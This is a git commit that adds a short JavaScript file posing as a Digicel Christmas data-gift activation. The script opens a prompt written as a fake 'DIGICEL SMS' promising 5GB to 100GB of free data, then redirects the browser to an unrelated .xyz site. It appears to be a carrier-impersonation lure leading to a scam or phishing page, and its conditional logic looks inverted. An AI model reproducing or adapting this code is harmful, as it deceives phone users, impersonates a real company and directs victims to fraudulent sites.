7ff24d5b48c428358a2398b736ccf78f7a7d55ff
zamonize1 <52072397+zamonize@users.noreply.github.com>
2024-12-29 04:36:43 -0800

    Create digicel-xmasgift-activation.js

---
+++ digicel-xmasgift-activation.js
@@ -0,0 +1,5 @@
+var password = '1'
+password=prompt('DIGICEL SMS: Dear customer, kindly check if your DIGICEL sim card is qualify to receive from 5GB to 100GB Data Reward For Christmas, press 1 to check now ','1');
+if (password != '1') {
+location.href='https://todyforu.xyz/digicel-xmasgift.html';
+}
